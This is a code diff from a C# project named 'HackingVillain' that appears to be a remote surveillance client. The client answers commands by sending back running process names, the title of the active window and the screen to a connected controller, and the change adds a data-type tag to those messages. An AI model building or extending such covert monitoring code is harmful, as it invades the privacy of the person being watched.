@@ -65,9 +65,9 @@ namespace HackingVillain
             }
         }
 
-        public void Send(string msg)
+        public void Send(string msg, int dataType = 0)
         {
-            Send(_client, Encoding.UTF8.GetBytes(msg), 0);
+            Send(_client, Encoding.UTF8.GetBytes(msg), dataType);
         }
 
         void Listen()
@@ -99,7 +99,7 @@ namespace HackingVillain
                 var processes = from p in Process.GetProcesses()
                                 where p.MainWindowTitle.Length > 0
                                 select p.ProcessName;
-                Send(string.Join("\n", processes));
+                Send(string.Join("\n", processes), 1);
             }
             else if (data == "Show Me The Screen")
             {
@@ -112,7 +112,7 @@ namespace HackingVillain
             }
             else if (data == "Current Window")
             {
-                Send(ForegroundWindow.GetActiveWindowTitle());
+                Send(ForegroundWindow.GetActiveWindowTitle(), 2);
             }
         }
     }
